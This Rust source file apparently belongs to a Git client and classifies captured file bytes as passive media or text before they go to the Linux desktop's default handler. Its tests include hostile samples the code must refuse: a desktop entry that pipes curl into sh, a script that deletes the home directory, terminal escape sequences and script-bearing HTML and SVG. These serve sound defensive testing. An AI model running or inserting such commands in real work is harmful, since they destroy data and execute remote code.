//! What Linux may hand to the desktop's default application, decided from the
//! captured bytes alone with the preview pipeline's own detectors
//! (`gitturtle_preview::metadata`). The repository file name never
//! contributes: it is attacker-controlled and would choose the handler. The
//! type decided here is not the last word: the launcher also asks GIO and,
//! for `xdg-open`, `xdg-mime` what they make of the written copy, and opens
//! it only when they agree (see [`Kind::media_types`]).
//!
//! Every allowed type is one whose default handler displays or plays data
//! rather than running it:
//!
//! | Kind | Copy suffix | Established by | Why it is passive |
//! | --- | --- | --- | --- |
//! | PNG, JPEG, GIF, WebP, BMP, TIFF, ICO | `png` `jpg` `gif` `webp` `bmp` `tiff` `ico` | the image crate's magic numbers, the raster set the preview renders | pixel formats; viewers decode them |
//! | AVIF, HEIF/HEIC, JPEG 2000 | `avif` `heic` `jp2` `j2k` | ISO `ftyp` brands and JP2/J2K signatures | image codecs |
//! | PDF | `pdf` | `%PDF-` | viewers render pages; PDF JavaScript and launch actions are the viewer's to refuse, as Quick Look does |
//! | WAV, MP3, FLAC, Ogg, MPEG-4/QuickTime, Matroska/WebM | `wav` `mp3` `flac` `ogg` `mp4` `m4a` `mov` `mkv` `webm` | the container signatures `inspect` reports | media players decode and play them |
//! | Plain text | `txt` | strict UTF-8 without NUL or control characters, no `#!` line, no desktop entry group, and no markup: nothing that begins with `<`, and none of the tags by which content sniffers call text HTML, SVG or XML in its first 4 KiB | editors show text |
//!
//! Everything else offers no action: unknown binary, desktop entries, scripts,
//! executables (ELF, PE, AppImage, which carry no allowed signature), HTML,
//! XHTML, SVG and other XML markup (as markup or as text), UTF-16 and other
//! encodings, office documents (OOXML and OpenDocument, whose bodies reach
//! outside the package; `docs/file-previews.md` lists how), JARs and plain
//! ZIP, tar, gzip, bzip2, xz, 7z and RAR archives, fonts, legacy OLE
//! documents, MPEG frame sync without a valid audio header, other raster
//! formats and binary 3D models.
use anyhow::Result;
use gitturtle_preview::{
    MAX_INPUT_BYTES,
    metadata::{self, Container},
};

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Kind {
    Png,
    Jpeg,
    Gif,
    WebP,
    Bmp,
    Tiff,
    Icon,
    Avif,
    Heif,
    Jp2,
    J2k,
    Pdf,
    Wav,
    Mp3,
    Flac,
    Ogg,
    Mp4,
    M4a,
    QuickTime,
    Matroska,
    WebM,
    Text,
}

impl Kind {
    /// The passive type the bytes establish, or `None` when they establish
    /// none. Only `check` (cancellation) returns an error.
    pub(crate) fn of(bytes: &[u8], check: &impl Fn() -> Result<()>) -> Result<Option<Self>> {
        check()?;
        if bytes.len() > MAX_INPUT_BYTES {
            return Ok(None);
        }
        // PDF may be entirely ASCII; it comes first, as in `inspect`.
        if metadata::container(bytes) == Some(Container::Pdf) {
            return Ok(Some(Self::Pdf));
        }
        // Text is text whatever signature it begins with: "BM" or "P3" make
        // the image crate guess an image, and a text handler shows it as such.
        if metadata::is_literal_text(bytes) {
            let text = std::str::from_utf8(bytes).unwrap_or_default();
            return Ok((passive_text(text) && !markup(bytes)).then_some(Self::Text));
        }
        if let Some(format) = metadata::jpeg2000_format(bytes) {
            return Ok(Some(if format.ends_with("JP2") {
                Self::Jp2
            } else {
                Self::J2k
            }));
        }
        match metadata::iso_image_format(bytes) {
            Some("AVIF") => return Ok(Some(Self::Avif)),
            Some(_) => return Ok(Some(Self::Heif)),
            None => {}
        }
        if let Ok(format) = image::guess_format(bytes) {
            use image::ImageFormat::*;
            return Ok(match format {
                Png => Some(Self::Png),
                Jpeg => Some(Self::Jpeg),
                Gif => Some(Self::Gif),
                WebP => Some(Self::WebP),
                Bmp => Some(Self::Bmp),
                Tiff => Some(Self::Tiff),
                Ico => Some(Self::Icon),
                Avif => Some(Self::Avif),
                _ => None,
            });
        }
        Ok(match metadata::container(bytes) {
            Some(Container::Wav) => Some(Self::Wav),
            Some(Container::Mp3) => mpeg_audio(bytes).then_some(Self::Mp3),
            Some(Container::Flac) => Some(Self::Flac),
            Some(Container::Ogg) => Some(Self::Ogg),
            Some(Container::IsoMedia) => Some(iso_media(bytes)),
            Some(Container::Matroska) => Some(
                if bytes[..bytes.len().min(64)]
                    .windows(4)
                    .any(|doc_type| doc_type == b"webm")
                {
                    Self::WebM
                } else {
                    Self::Matroska
                },
            ),
            _ => None,
        })
    }

    /// The suffix the private copy is written with. GIO, which the portal
    /// uses, types a file by its suffix only when one type alone claims it
    /// (`*.txt`, `*.pdf`); a suffix that several types claim (`*.png` by PNG
    /// and APNG, `*.ogg` by six) makes it sniff the content, where magic of
    /// priority 80 or more wins, so the launcher checks GIO's answer rather
    /// than relying on the suffix.
    pub(crate) fn extension(self) -> &'static str {
        match self {
            Self::Png => "png",
            Self::Jpeg => "jpg",
            Self::Gif => "gif",
            Self::WebP => "webp",
            Self::Bmp => "bmp",
            Self::Tiff => "tiff",
            Self::Icon => "ico",
            Self::Avif => "avif",
            Self::Heif => "heic",
            Self::Jp2 => "jp2",
            Self::J2k => "j2k",
            Self::Pdf => "pdf",
            Self::Wav => "wav",
            Self::Mp3 => "mp3",
            Self::Flac => "flac",
            Self::Ogg => "ogg",
            Self::Mp4 => "mp4",
            Self::M4a => "m4a",
            Self::QuickTime => "mov",
            Self::Matroska => "mkv",
            Self::WebM => "webm",
            Self::Text => "txt",
        }
    }

    pub(crate) fn description(self) -> &'static str {
        match self {
            Self::Png => "a PNG image",
            Self::Jpeg => "a JPEG image",
            Self::Gif => "a GIF image",
            Self::WebP => "a WebP image",
            Self::Bmp => "a BMP image",
            Self::Tiff => "a TIFF image",
            Self::Icon => "an icon",
            Self::Avif => "an AVIF image",
            Self::Heif => "a HEIF image",
            Self::Jp2 => "a JPEG 2000 image",
            Self::J2k => "a JPEG 2000 codestream",
            Self::Pdf => "a PDF document",
            Self::Wav => "WAV audio",
            Self::Mp3 => "MP3 audio",
            Self::Flac => "FLAC audio",
            Self::Ogg => "Ogg media",
            Self::Mp4 => "MPEG-4 media",
            Self::M4a => "MPEG-4 audio",
            Self::QuickTime => "a QuickTime movie",
            Self::Matroska => "Matroska media",
            Self::WebM => "WebM media",
            Self::Text => "plain text",
        }
    }

    /// Whether `xdg-open` may be tried for this copy at all. Its generic
    /// mode, the one Hyprland and other wlroots desktops get, types the copy
    /// with `xdg-mime query filetype`, which sniffs content (libmagic's
    /// `file --mime-type`) rather than reading the suffix written here. Text
    /// is reclassified by what it contains (HTML and SVG go to a browser,
    /// `#EXTM3U` to a media player that follows the playlist's URLs), so text
    /// goes only through the portal, where GIO types `.txt` by its suffix
    /// alone (only `text/plain` claims it) and the launcher checks that.
    /// A binary kind's signature does not settle what a sniffer answers
    /// either (an Ogg stream with an ISO 9660 volume descriptor at 32 KiB is
    /// a disk image to libmagic), so the launcher also checks that answer
    /// against [`Kind::media_types`] before `xdg-open` runs.
    pub(crate) fn typed_by_signature(self) -> bool {
        !matches!(self, Self::Text)
    }

    /// The media types a desktop's type sniffer may report for this kind:
    /// the shared-mime-info and libmagic names, with their common aliases.
    /// Any other answer means the copy would open as something else.
    pub(crate) fn media_types(self) -> &'static [&'static str] {
        match self {
            Self::Png => &["image/png", "image/apng"],
            Self::Jpeg => &["image/jpeg", "image/pjpeg"],
            Self::Gif => &["image/gif"],
            Self::WebP => &["image/webp"],
            Self::Bmp => &["image/bmp", "image/x-bmp", "image/x-ms-bmp"],
            Self::Tiff => &["image/tiff"],
            Self::Icon => &["image/vnd.microsoft.icon", "image/x-icon"],
            Self::Avif => &["image/avif"],
            Self::Heif => &[
                "image/heif",
                "image/heic",
                "image/heif-sequence",
                "image/heic-sequence",
            ],
            Self::Jp2 => &["image/jp2", "image/jpx"],
            Self::J2k => &["image/x-jp2-codestream", "image/jp2"],
            Self::Pdf => &["application/pdf", "application/x-pdf"],
            Self::Wav => &["audio/x-wav", "audio/wav", "audio/vnd.wave", "audio/wave"],
            Self::Mp3 => &["audio/mpeg", "audio/mp3", "audio/x-mp3", "audio/x-mpeg"],
            Self::Flac => &["audio/flac", "audio/x-flac"],
            Self::Ogg => &[
                "audio/ogg",
                "video/ogg",
                "application/ogg",
                "audio/x-vorbis+ogg",
                "audio/x-opus+ogg",
                "audio/x-flac+ogg",
                "audio/x-speex+ogg",
                "video/x-theora+ogg",
            ],
            Self::Mp4 => &["video/mp4", "audio/mp4", "application/mp4"],
            Self::M4a => &["audio/x-m4a", "audio/mp4", "audio/m4a"],
            Self::QuickTime => &["video/quicktime"],
            Self::Matroska => &[
                "video/x-matroska",
                "video/matroska",
                "audio/x-matroska",
                "audio/matroska",
            ],
            Self::WebM => &["video/webm", "audio/webm"],
            Self::Text => &["text/plain"],
        }
    }
}

fn iso_media(bytes: &[u8]) -> Kind {
    if bytes.get(4..8) == Some(b"moov") {
        return Kind::QuickTime;
    }
    match bytes.get(8..12) {
        Some(b"qt  ") => Kind::QuickTime,
        Some(b"M4A " | b"M4B " | b"M4P " | b"F4A " | b"F4B ") => Kind::M4a,
        _ => Kind::Mp4,
    }
}

/// Text that a text handler only shows. Control characters other than tab,
/// line breaks and form feed are refused, since a handler that writes to a
/// terminal would act on escape sequences; so are an interpreter (`#!`) line
/// and a desktop entry group, which file managers and launchers run.
fn passive_text(text: &str) -> bool {
    let body = text.trim_start_matches('\u{feff}');
    !body.starts_with("#!")
        && !text
            .chars()
            .any(|c| c.is_control() && !matches!(c, '\t' | '\n' | '\r' | '\u{c}'))
        && !text.lines().any(|line| {
            line.trim_start_matches(|c: char| c.is_whitespace() || c == '\u{feff}')
                .starts_with("[Desktop ")
        })
}

/// How much of a file content sniffers search for markup: libmagic's HTML
/// and XML entries use `search/4096`.
const SNIFFED: usize = 4096;
/// Tags by which content sniffers (libmagic's `sgml` entries and browsers'
/// HTML sniffing) call text HTML, SVG or XML wherever they appear in the
/// sniffed window, matched without regard to case.
const MARKUP: [&[u8]; 16] = [
    b"<!doctype",
    b"<?xml",
    b"<html",
    b"<head",
    b"<body",
    b"<title",
    b"<script",
    b"<style",
    b"<iframe",
    b"<frameset",
    b"<object",
    b"<embed",
    b"<table",
    b"<a href",
    b"<svg",
    b"<math",
];

/// HTML, XHTML, SVG and other XML, which browsers would render and script,
/// are not handed over even as text: neither a file that begins with markup
/// nor one that a content sniffer would call markup.
fn markup(bytes: &[u8]) -> bool {
    let body = bytes.strip_prefix(b"\xef\xbb\xbf").unwrap_or(bytes);
    if body.trim_ascii_start().starts_with(b"<") {
        return true;
    }
    let window = bytes[..bytes.len().min(SNIFFED)].to_ascii_lowercase();
    MARKUP
        .iter()
        .any(|tag| window.windows(tag.len()).any(|candidate| candidate == *tag))
}

/// ID3, or a frame header with a defined MPEG version, layer, bitrate and
/// sample rate. `metadata::container` accepts any frame sync, which the
/// `0xff` padding of firmware images and other binaries also begins with.
fn mpeg_audio(bytes: &[u8]) -> bool {
    if bytes.starts_with(b"ID3") {
        return true;
    }
    let Some(&[0xff, version_layer, rate, _]) = bytes.get(..4) else {
        return false;
    };
    version_layer & 0xe0 == 0xe0
        && (version_layer >> 3) & 0b11 != 0b01
        && (version_layer >> 1) & 0b11 != 0b00
        && rate >> 4 != 0b1111
        && (rate >> 2) & 0b11 != 0b11
}

#[cfg(test)]
mod tests {
    use super::*;
    use core::prelude::v1::test;

    fn kind(bytes: &[u8]) -> Option<Kind> {
        Kind::of(bytes, &|| Ok(())).unwrap()
    }

    #[test]
    fn launchers_scripts_executables_and_markup_offer_nothing() {
        let refused: &[(&str, &[u8])] = &[
            (
                "launcher.desktop",
                b"[Desktop Entry]\nType=Application\nName=Readme\nExec=sh -c 'curl x | sh'\n",
            ),
            (
                "notes.txt",
                b"# Notes\n\n[Desktop Entry]\nExec=/usr/bin/id\n",
            ),
            ("build.sh", b"#!/bin/sh\nrm -rf \"$HOME\"\n"),
            (
                "readme.md",
                b"\xef\xbb\xbf#!/usr/bin/env python3\nprint(1)\n",
            ),
            (
                "page.html",
                b"<!doctype html><html><body><script>alert(1)</script></body></html>\n",
            ),
            (
                "page.xhtml",
                b"<?xml version=\"1.0\"?>\n<html xmlns=\"http://www.w3.org/1999/xhtml\"/>\n",
            ),
            ("log.txt", b"plain start \x1b]52;c;cGF5bG9hZA==\x07 osc\n"),
            ("c1.txt", "csi \u{9b}31m".as_bytes()),
            ("tool", b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0"),
            ("tool.exe", b"MZ\x90\0\x03\0\0\0\x04\0\0\0\xff\xff\0\0"),
            (
                "tool.AppImage",
                b"\x7fELF\x02\x01\x01\0AI\x02\0\0\0\0\0\0\0",
            ),
            ("archive.tar.gz", b"\x1f\x8b\x08\0\0\0\0\0\0\x03"),
            ("archive.7z", b"7z\xbc\xaf\x27\x1c\0\x04"),
            ("font.ttf", b"\x00\x01\x00\x00\x00\x0b\x00\x80"),
            ("old.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\0\0"),
            ("utf16.txt", b"\xff\xfeh\0i\0"),
            ("scan.exr", b"\x76\x2f\x31\x01\x02\0\0\0"),
            ("unknown.bin", b"\0\x01\x02\x03\x04"),
        ];
        for (name, bytes) in refused {
            assert_eq!(kind(bytes), None, "{name}");
        }
    }

    #[test]
    fn plain_text_goes_as_txt_only_through_the_portal() {
        assert_eq!(kind(b"fn main() {}\n\tok\r\n\x0c"), Some(Kind::Text));
        // Text that begins with an image crate magic is still text.
        assert_eq!(kind(b"BMW service notes\n"), Some(Kind::Text));
        assert_eq!(kind(b"P3 is a section name\n"), Some(Kind::Text));
        // Comparisons and generics are not markup.
        assert_eq!(kind(b"if a<b && c > d { Vec<u8> }\n"), Some(Kind::Text));
        assert_eq!(Kind::Text.extension(), "txt");
        assert!(!Kind::Text.typed_by_signature());
    }

    /// SVG and HTML are refused even as text, whether they begin with markup
    /// or hide it after a line of prose where a content sniffer still finds
    /// it; markup past the sniffed window does not make text active.
    #[test]
    fn svg_html_and_sniffed_markup_offer_nothing() {
        let refused: &[(&str, &[u8])] = &[
            (
                "drawing.svg",
                b"<?xml version=\"1.0\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\"><script>x()</script></svg>\n",
            ),
            (
                "inert.svg",
                b"<svg xmlns=\"http://www.w3.org/2000/svg\"><rect width=\"1\" height=\"1\"/></svg>",
            ),
            ("bom.html", b"\xef\xbb\xbf \n\t<p>hi</p>"),
            (
                "notes.txt",
                b"Release notes\n\n<SCRIPT>fetch('https://example.invalid')</SCRIPT>\n",
            ),
            ("readme.md", b"# Title\n\n<a href=\"x\">link</a>\n"),
            ("diagram.txt", b"Drawing follows\n<svg onload=\"x()\"/>\n"),
            ("feed.txt", b"Feed\n<?xml version=\"1.0\"?><rss/>\n"),
        ];
        for (name, bytes) in refused {
            assert_eq!(kind(bytes), None, "{name}");
        }
        let mut late = vec![b'a'; SNIFFED];
        late.extend_from_slice(b"\n<script>x()</script>\n");
        assert_eq!(kind(&late), Some(Kind::Text));
    }

    #[test]
    fn mpeg_audio_needs_id3_or_a_valid_frame_header() {
        // MPEG-1 layer III, 128 kbit/s, 44.1 kHz.
        assert_eq!(kind(b"\xff\xfb\x90\x64\0\0\0\0"), Some(Kind::Mp3));
        assert_eq!(kind(b"ID3\x04\0\0\0\0\0\0"), Some(Kind::Mp3));
        for (name, bytes) in [
            ("firmware padding", b"\xff\xff\xff\xff\x10\x20".as_slice()),
            ("reserved version", b"\xff\xeb\x90\x64".as_slice()),
            ("reserved layer", b"\xff\xf9\x90\x64".as_slice()),
            ("invalid bitrate", b"\xff\xfb\xf0\x64".as_slice()),
            ("reserved sample rate", b"\xff\xfb\x9c\x64".as_slice()),
        ] {
            assert_eq!(kind(bytes), None, "{name}");
        }
    }

    #[test]
    fn content_names_the_type_whatever_the_file_is_called() {
        let avif = include_bytes!("../../../preview/tests/fixtures/half-red-blue.avif");
        let heic = include_bytes!("../../../preview/tests/fixtures/half-red-blue.heic");
        let jp2 = include_bytes!("../../../preview/tests/fixtures/half-red-blue.jp2");
        let j2k = include_bytes!("../../../preview/tests/fixtures/half-red-blue.j2k");
        // The worker hands the classifier bytes only; a name such as
        // "launcher.desktop" or "photo.pdf" has nowhere to go.
        for (bytes, expected, extension) in [
            (
                b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".as_slice(),
                Kind::Png,
                "png",
            ),
            (avif.as_slice(), Kind::Avif, "avif"),
            (heic.as_slice(), Kind::Heif, "heic"),
            (jp2.as_slice(), Kind::Jp2, "jp2"),
            (j2k.as_slice(), Kind::J2k, "j2k"),
            (b"%PDF-1.7\n%\xe2\xe3\n".as_slice(), Kind::Pdf, "pdf"),
            (b"%PDF-1.4 all ascii\n".as_slice(), Kind::Pdf, "pdf"),
            (b"GIF89a\x01\0\x01\0\0\0\0;".as_slice(), Kind::Gif, "gif"),
            (
                b"\xff\xd8\xff\xe0\0\x10JFIF\0".as_slice(),
                Kind::Jpeg,
                "jpg",
            ),
            (b"RIFF\x24\0\0\0WAVEfmt ".as_slice(), Kind::Wav, "wav"),
            (b"ID3\x04\0\0\0\0\0\0".as_slice(), Kind::Mp3, "mp3"),
            (
                b"\0\0\0\x18ftypmp42\0\0\0\0mp42".as_slice(),
                Kind::Mp4,
                "mp4",
            ),
            (
                b"\0\0\0\x14ftypqt  \0\0\0\0".as_slice(),
                Kind::QuickTime,
                "mov",
            ),
            (
                b"\0\0\0\x18ftypM4A \0\0\0\0M4A ".as_slice(),
                Kind::M4a,
                "m4a",
            ),
            (
                b"\0\0\0\x18ftypmif1\0\0\0\0mif1heic".as_slice(),
                Kind::Heif,
                "heic",
            ),
            (
                b"\x1a\x45\xdf\xa3\x9f\x42\x86\x81\x01\x42\x82\x84webm\0".as_slice(),
                Kind::WebM,
                "webm",
            ),
            (
                b"\x1a\x45\xdf\xa3\x93\x42\x82\x88matroska\0".as_slice(),
                Kind::Matroska,
                "mkv",
            ),
            (b"fLaC\0\0\0\x22".as_slice(), Kind::Flac, "flac"),
            (b"OggS\0\x02\0\0".as_slice(), Kind::Ogg, "ogg"),
        ] {
            assert_eq!(kind(bytes), Some(expected));
            assert_eq!(expected.extension(), extension);
            assert!(expected.typed_by_signature());
        }
    }

    /// Office documents reach outside their package from their bodies
    /// (field codes, data connections, DDE, linked content), so neither
    /// OOXML nor OpenDocument is offered, nor are archives.
    #[test]
    fn office_documents_and_archives_offer_nothing() {
        // Stored members written by hand.
        let package = |members: &[(&str, &[u8])]| {
            let mut bytes = Vec::new();
            let mut directory = Vec::new();
            for (name, data) in members {
                let offset = bytes.len() as u32;
                let (name_length, size) = (name.len() as u16, data.len() as u32);
                bytes.extend_from_slice(b"PK\x03\x04\x14\0\0\0\0\0\0\0\0\0\0\0\0\0");
                bytes.extend_from_slice(&size.to_le_bytes());
                bytes.extend_from_slice(&size.to_le_bytes());
                bytes.extend_from_slice(&name_length.to_le_bytes());
                bytes.extend_from_slice(&[0, 0]);
                bytes.extend_from_slice(name.as_bytes());
                bytes.extend_from_slice(data);
                directory.extend_from_slice(b"PK\x01\x02\x14\0\x14\0\0\0\0\0\0\0\0\0\0\0\0\0");
                directory.extend_from_slice(&size.to_le_bytes());
                directory.extend_from_slice(&size.to_le_bytes());
                directory.extend_from_slice(&name_length.to_le_bytes());
                directory.extend_from_slice(&[0; 12]);
                directory.extend_from_slice(&offset.to_le_bytes());
                directory.extend_from_slice(name.as_bytes());
            }
            let (start, length) = (bytes.len() as u32, directory.len() as u32);
            let count = (members.len() as u16).to_le_bytes();
            bytes.extend(directory);
            bytes.extend_from_slice(b"PK\x05\x06\0\0\0\0");
            bytes.extend_from_slice(&count);
            bytes.extend_from_slice(&count);
            bytes.extend_from_slice(&length.to_le_bytes());
            bytes.extend_from_slice(&start.to_le_bytes());
            bytes.extend_from_slice(&[0, 0]);
            bytes
        };
        let odt = package(&[
            ("mimetype", b"application/vnd.oasis.opendocument.text"),
            ("content.xml", b"<office:document-content/>"),
        ]);
        assert_eq!(kind(&odt), None, "OpenDocument is not offered");
        let docx = package(&[
            (
                "[Content_Types].xml",
                br#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#,
            ),
            ("_rels/.rels", br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>"#),
            ("word/document.xml", b"<w:document/>"),
        ]);
        assert_eq!(kind(&docx), None, "OOXML is not offered");
        let jar = package(&[
            ("META-INF/MANIFEST.MF", b"Main-Class: Evil\n"),
            ("Evil.class", b"\xca\xfe\xba\xbe"),
        ]);
        assert_eq!(kind(&jar), None);
        assert_eq!(kind(&package(&[("photo.png", b"\x89PNG\r\n\x1a\n")])), None);
    }

    #[test]
    fn oversized_bytes_offer_nothing() {
        let mut bytes = b"\x89PNG\r\n\x1a\n".to_vec();
        bytes.resize(MAX_INPUT_BYTES + 1, 0);
        assert_eq!(kind(&bytes), None);
    }
}
